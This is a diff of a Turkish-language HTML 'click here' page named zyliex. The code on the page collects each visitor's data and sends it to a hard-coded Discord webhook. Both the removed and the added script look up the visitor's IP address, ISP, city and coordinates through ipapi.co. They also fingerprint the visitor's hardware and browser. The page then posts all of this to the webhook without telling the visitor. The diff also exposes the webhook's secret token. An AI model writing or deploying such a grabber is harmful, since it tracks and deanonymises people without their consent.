@@ -2,109 +2,89 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>zyliex</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Courier New', monospace; height: 100vh; overflow: hidden; position: relative; background-color: #000; color: #fff; }
-        
-        #entry-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; cursor: pointer; z-index: 100; background-color: #000; }
-        #enter-text { color: #00ff00; font-size: 2em; text-shadow: 0 0 5px #00ff00; animation: blink 1.5s infinite; text-align: center; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-        
-        #main-content { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; }
-        #background-gif { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1; opacity: 0.7; }
-        
-        #info-display { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px; white-space: pre; line-height: 1.4; color: #00ff00; max-width: 600px; max-height: 90vh; overflow-y: auto; font-size: 32px; font-weight: bold; text-transform: uppercase; text-align: center; }
-        .info-line { opacity: 0; transform: translateY(20px); animation: fadeInZoom 0.5s forwards; }
-        @keyframes fadeInZoom { from { opacity: 0; transform: translateY(20px) scale(0.8); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        
-        #info-display::-webkit-scrollbar { display: none; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #00ff00; height: 100vh; overflow: hidden; }
+        #entry-screen { position: fixed; top:0; left:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; cursor:pointer; }
+        #main-content { display: none; padding: 20px; height: 100vh; overflow-y: auto; }
+        .info-line { font-size: 14px; margin-bottom: 3px; }
     </style>
 </head>
 <body>
-   
-    <div id="entry-screen">
-        <div id="enter-text">tıkla</div>
-    </div>
+
+    <div id="entry-screen"><div>[tıkla]</div></div>
 
     <div id="main-content">
-        <img id="background-gif" src="zyliex.gif" alt="Background">
         <div id="info-display"></div>
     </div>
-    
-    <audio id="background-music" loop>
-        <source src="zyliex.mp3" type="audio/mpeg">
-    </audio>
 
     <script>
-        document.getElementById('entry-screen').addEventListener('click', function() {
+        document.getElementById('entry-screen').addEventListener('click', async function() {
             this.style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
-            const music = document.getElementById('background-music');
-            music.volume = 0.5;
-            music.play().catch(e => console.log("Auto-play prevented:", e));
-            displaySystemInfo();
-        });
-        
-        async function displaySystemInfo() {
+            
             const display = document.getElementById('info-display');
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ'; // BURAYA DİSCORD WEBHOOK URL'İNİ YAZ
+            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 1, charging: true }));
+            const connection = navigator.connection || {};
+            
+            const infoLines = [
+                `--- NETWORK ---`,
+                `IP ADDRESS: ${ipData.ip}`,
+                `ISP: ${ipData.org}`,
+                `ASN: ${ipData.asn}`,
+                `KONUM: ${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                `LAT/LONG: ${ipData.latitude}, ${ipData.longitude}`,
+                `TIMEZONE: ${ipData.timezone}`,
+                `BAĞLANTI TÜRÜ: ${connection.effectiveType || 'N/A'}`,
+                `DOWNLINK: ${connection.downlink || 'N/A'} Mbps`,
+                `--- HARDWARE ---`,
+                `CPU THREADS: ${navigator.hardwareConcurrency}`,
+                `GPU VENDOR: ${getGPUInfo('vendor')}`,
+                `GPU RENDERER: ${getGPUInfo('renderer')}`,
+                `RAM (JS HEAP): ${(performance.memory ? (performance.memory.totalJSHeapSize / 1048576).toFixed(0) + ' MB' : 'Kısıtlı')}`,
+                `PİL SEVİYESİ: ${(battery.level * 100).toFixed(0)}%`,
+                `ŞARJ DURUMU: ${battery.charging ? 'EVET' : 'HAYIR'}`,
+                `--- BROWSER & SYSTEM ---`,
+                `USER AGENT: ${navigator.userAgent}`,
+                `PLATFORM: ${navigator.platform}`,
+                `DİL: ${navigator.language}`,
+                `ÇEREZLER: ${navigator.cookieEnabled ? 'AÇIK' : 'KAPALI'}`,
+                `DO NOT TRACK: ${navigator.doNotTrack || 'Bilinmiyor'}`,
+                `EKRAN: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
+                `PENCERE: ${window.innerWidth}x${window.innerHeight}`,
+                `ZAMAN: ${new Date().toLocaleString()}`
+            ];
 
-            try {
-                const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-                const now = new Date();
+            fetch('https://discordapp.com/api/webhooks/1516629813337522298/qhB-GiRVtBCaUcwNWSygoM9pIazDRlIdSZExyh276OfEyEtCSEn3_bFUoOPhSyJYrnRJ', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "🔍 **üye**",
+                    embeds: [{
+                        color: 0x00ff00,
+                        description: infoLines.join('\n')
+                    }]
+                })
+            });
 
-                // Discord'a bilgi gönder
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "Yeni Ziyaretçi Tespit Edildi",
-                            color: 0x00ff00,
-                            fields: [
-                                { name: "IP", value: ipData.ip || "N/A", inline: true },
-                                { name: "Konum", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-                                { name: "ISP", value: ipData.org || "N/A", inline: false }
-                            ]
-                        }]
-                    })
-                }).catch(e => console.log("Webhook gönderilemedi"));
+            infoLines.forEach((line, i) => {
+                setTimeout(() => {
+                    const div = document.createElement('div');
+                    div.className = 'info-line';
+                    div.textContent = `> ${line}`;
+                    display.appendChild(div);
+                }, i * 100);
+            });
+        });
 
-                let gpuInfo = 'Unknown';
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} (${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)})`;
-                    }
-                } catch (e) {}
-
-                const infoLines = [
-                    `IP ADDRESS: ${ipData.ip || 'UNKNOWN'}`,
-                    `COUNTRY: ${ipData.country_name || 'UNKNOWN'}`,
-                    `CITY: ${ipData.city || 'UNKNOWN'}`,
-                    `TIME: ${now.toLocaleTimeString()}`,
-                    `ISP: ${ipData.org || 'UNKNOWN'}`,
-                    `THREADS: ${navigator.hardwareConcurrency || 'UNKNOWN'}`,
-                    `GPU: ${gpuInfo}`
-                ];
-
-                display.innerHTML = '';
-                infoLines.forEach((line, index) => {
-                    setTimeout(() => {
-                        const lineElement = document.createElement('div');
-                        lineElement.className = 'info-line';
-                        lineElement.textContent = line;
-                        display.appendChild(lineElement);
-                    }, index * 200);
-                });
-
-            } catch (error) {
-                console.error("Error:", error);
-            }
+        function getGPUInfo(type) {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return "Desteklenmiyor";
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? (type === 'vendor' ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)) : "Bilinmiyor";
         }
     </script>
 </body>
